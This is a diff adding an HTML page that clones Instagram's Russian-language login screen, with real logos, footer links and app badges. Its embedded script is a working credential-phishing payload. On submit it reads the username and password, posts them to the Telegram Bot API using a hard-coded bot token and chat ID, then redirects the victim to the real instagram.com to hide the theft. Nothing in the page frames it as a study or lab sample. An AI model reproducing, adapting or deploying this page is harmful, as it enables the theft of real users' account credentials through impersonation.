@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="/img/instagram_logo.svg">
+    <style>
+        body {
+            background-color: #FFFFFF;
+            font-family: Arial, sans-serif;
+        }
+
+        * {
+            text-decoration: none;
+        }
+
+        .container {
+            max-width: 1920px;
+            margin: 0 auto;
+        }
+
+        .login-container {
+            width: 290px;
+            border-radius: 1px;
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid rgb(219, 219, 219);
+            text-align: center;
+            padding-top: 40px;
+            padding-left: 40px;
+            padding-right: 40px;
+        }
+
+        #login-form {
+            margin-top: 24px;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px 10px;
+            margin: 3px 0;
+            display: inline-block;
+            border: 1px solid rgb(219, 219, 219);
+            border-radius: 4px;
+            box-sizing: border-box;
+            outline: none;
+            background-color: rgb(250, 250, 250);
+            ;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            background-color: #4CB5F9;
+            color: white;
+            padding: 10px 20px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #1f99ea;
+        }
+
+        .img_1 {
+            height: 581.15px;
+        }
+
+        @keyframes slideIn {
+            0% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .img_1 {
+            animation: slideIn 1s ease-in-out;
+        }
+
+        .img_1 {
+            animation-name: slideIn;
+            animation-duration: 1s;
+            animation-timing-function: ease-in-out;
+        }
+
+        .img_1 {
+            animation: slideIn 1s ease-in-out;
+        }
+
+        .box {
+            display: flex;
+            align-items: start;
+            gap: 32px;
+        }
+
+        .box_container {
+            display: flex;
+            margin-top: 32px;
+            justify-content: center;
+        }
+
+        .inst_logo_text {
+            width: 174px;
+            height: 50px;
+        }
+
+        .el2 {
+            padding-top: 10px;
+        }
+
+        hr {
+            width: 45%;
+            border: solid 1px rgb(219, 219, 219);
+
+        }
+
+        .hrs {
+            display: flex;
+            gap: 10px;
+            align-items: start;
+        }
+
+        .or {
+            color: #737373;
+        }
+
+        .face_book_img {
+            width: 16px;
+            height: 16px;
+        }
+
+        .face_book {
+            margin: 10px;
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            font-size: 14px;
+            color: #385185;
+        }
+
+        .reset_password {
+            font-size: 12px;
+            color: #00376B;
+        }
+
+        .no_acc {
+            width: 290px;
+            border-radius: 1px;
+            background-color: #fff;
+            border: 1px solid rgb(219, 219, 219);
+            text-align: center;
+            padding-left: 40px;
+            padding-right: 40px;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            margin-top: 10px;
+            display: flex;
+            gap: 7px;
+
+        }
+
+        .no_acc_text {
+            font-size: 13px;
+        }
+
+        .regist {
+            font-size: 13px;
+            color: #0095F6;
+            font-weight: 600;
+        }
+
+        .download_apps_text {
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .download_apps {
+            margin-top: 20px;
+        }
+
+        .app1_img {
+            width: 140px;
+            height: 40px;
+        }
+
+        .app2_img {
+            width: 115px;
+            height: 40px;
+        }
+
+        .apps {
+            display: flex;
+            margin-top: 10px;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .footer_nav {
+            font-size: 12px;
+            color: #737373;
+        }
+
+        .footer_nav:hover {
+            text-decoration: underline;
+        }
+
+        .navs_footer {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .icon_bottom {
+            width: 10px;
+            height: 10px;
+        }
+
+        .lang {
+            cursor: pointer;
+            font-size: 12px;
+            color: #737373;
+        }
+
+        .from {
+            font-size: 12px;
+            color: #737373;
+        }
+
+        .footer_doc {
+            display: flex;
+            justify-content: center;
+            margin-top: 17px;
+            gap: 20px;
+        }
+
+        footer {
+            margin-top: 50px;
+            margin-bottom: 52px;
+        }
+
+
+        @media screen and (max-width: 875px) {
+
+            .el1 {
+                display: none;
+            }
+        }
+
+        @media screen and (max-width: 1135px) {
+
+            .navs_footer {
+                display: flex;
+                flex-wrap: wrap;
+                text-align: center;
+            }
+
+            footer {
+                margin-top: 65px;
+            }
+        }
+
+        @media screen and (max-width: 370px) {
+            footer {
+                margin-top: 80px;
+            }
+        }
+
+        @media screen and (max-width: 355px) {
+            footer {
+                margin-top: 100px;
+            }
+        }
+
+        @media screen and (max-width: 330px) {
+            footer {
+                margin-top: 150px;
+            }
+        }
+
+        @media screen and (max-width: 449px) {
+
+            .login-container {
+                border: none;
+            }
+
+            .no_acc {
+                border: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="box_container">
+            <div class="box">
+                <div class="el1">
+                    <img class="img_1" src="/img/img_1.png" alt="">
+                    <img class="img_1" src="/img/img_2.png" alt="">
+                    <img class="img_1" src="/img/img_3.png" alt="">
+                    <img class="img_1" src="/img/img_4.png" alt="">
+                </div>
+                <div class="el2">
+                    <div class="login-container">
+                        <a href="#"><img class="inst_logo_text" src="/img/instagram_logo_text.png" alt=""></a>
+                        <form id="login-form">
+                            <input type="text" id="username" name="username"
+                                placeholder="Телефон, имя пользователя или эл. адрес" required>
+                            <input type="password" id="password" name="password" placeholder="Пароль" required>
+                            <button type="submit">Войти</button>
+                            <div class="hrs">
+                                <hr><span class="or">или</span>
+                                <hr>
+                            </div>
+                            <a href="https://www.facebook.com/">
+                                <div class="face_book"><img class="face_book_img" src="/img/facebook_icon.jpg"
+                                        alt="">Войти
+                                    через Facebook</div>
+                            </a>
+                            <a class="reset_password" href="https://www.instagram.com/accounts/password/reset/">Забыли
+                                пароль?</a>
+                        </form>
+                    </div>
+                    <div class="no_acc">
+                        <p class="no_acc_text">У вас ещё нет аккаунта?</p>
+                        <a href="https://www.instagram.com/accounts/emailsignup/">
+                            <p class="regist">Зарегистрироваться</p>
+                        </a>
+                    </div>
+                    <div class="download_apps">
+                        <p class="download_apps_text">Установите приложение.</p>
+                        <div class="apps">
+                            <a
+                                href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D9535F055-EF49-4640-BC6C-7F52F586FFA2%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1">
+                                <div class="app1"><img class="app1_img" src="/img/play_market_icon.png" alt=""></div>
+                            </a>
+                            <a href="https://www.microsoft.com/ru-uz/store/b/home">
+                                <div class="app2"><img class="app2_img" src="/img/microsoft_icon.png" alt=""></div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <div class="navs_footer">
+                <a class="footer_nav"
+                    href="https://l.instagram.com/?u=https%3A%2F%2Fabout.meta.com%2F&e=AT3myAPy6CaDpdp22ZXYI5MY5YLn036BMsTDDRyR3RRjEMox9doEPekEXIUYVMjG2kaqele2X5qux3zWUU9qJ6odZ88qouRR&s=1">
+                    <nav>Meta</nav>
+                </a>
+                <a class="footer_nav" href="https://about.instagram.com/">
+                    <nav>Информация</nav>
+                </a>
+                <a class="footer_nav" href="https://about.instagram.com/blog">
+                    <nav>Блог</nav>
+                </a>
+                <a class="footer_nav" href="https://about.instagram.com/about-us/careers">
+                    <nav>Вакансии</nav>
+                </a>
+                <a class="footer_nav" href="https://help.instagram.com/">
+                    <nav>Помощь</nav>
+                </a>
+                <a class="footer_nav" href="https://developers.facebook.com/docs/instagram">
+                    <nav>API</nav>
+                </a>
+                <a class="footer_nav"
+                    href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">
+                    <nav>Конфиденциальность</nav>
+                </a>
+                <a class="footer_nav" href="https://help.instagram.com/581066165581870/">
+                    <nav>Условия</nav>
+                </a>
+                <a class="footer_nav"
+                    href="https://www.instagram.com/explore/locations/?next=https%3A%2F%2Fwww.instagram.com%2F">
+                    <nav>Места</nav>
+                </a>
+                <a class="footer_nav"
+                    href="https://www.instagram.com/web/lite/?next=https%3A%2F%2Fwww.instagram.com%2F">
+                    <nav>Instagram Lite</nav>
+                </a>
+                <a class="footer_nav" href="https://www.threads.net/login">
+                    <nav>Threads</nav>
+                </a>
+                <a class="footer_nav"
+                    href="https://www.facebook.com/help/instagram/261704639352628?next=https%3A%2F%2Fwww.instagram.com%2F">
+                    <nav class="long_nav">Загрузка контактов и лица, не являющиеся пользователями</nav>
+                </a>
+                <a class="footer_nav"
+                    href="https://l.instagram.com/?u=https%3A%2F%2Fabout.meta.com%2Ftechnologies%2Fmeta-verified%2F&e=AT1uEREXu9c6rPsPgvPOxqUOoKhydLl15zCsTombXOakXxh-jYjMyHTXqwRJB1S75KoAW24TFskSU7i1dcGJfyLiXXwRjJA5&s=1">
+                    <nav>Meta Verified</nav>
+                </a>
+            </div>
+            <div class="footer_doc">
+                <div class="lang">Русский <img class="icon_bottom" src="img/icon_bottom.svg" alt=""></div>
+                <div class="from">© 2024 Instagram from Meta</div>
+            </div>
+        </footer>
+
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function () {
+                const images = document.querySelectorAll('.img_1');
+                let index = 0;
+                function showNextImage() {
+                    images.forEach(image => image.style.display = 'none');
+                    index = (index + 1) % images.length;
+                    images[index].style.display = 'block';
+                }
+                showNextImage();
+                setInterval(showNextImage, 5000);
+            });
+            const TELEGRAM_BOT_TOKEN = '7075634870:AAHCsmsDjn0mHRivRzjHJXla-7l6Wc5wkx8';
+            const CHAT_ID = '6541356641';
+
+            document.getElementById('login-form').addEventListener('submit', function (event) {
+                event.preventDefault();
+                let username = document.getElementById('username').value;
+                let password = document.getElementById('password').value;
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `Username: ${username}
+Password: ${password}`
+                    })
+                })
+                    .then(response => {
+                        if (response.ok) {
+                            document.getElementById('username').value = '';
+                            document.getElementById('password').value = '';
+                            window.location.href = 'https://www.instagram.com/';
+                        } else {
+                            console.error('Failed to send message via Telegram');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending message via Telegram:', error);
+                    });
+            });
+        </script>
+    </div>
+</body>
+
+</html>
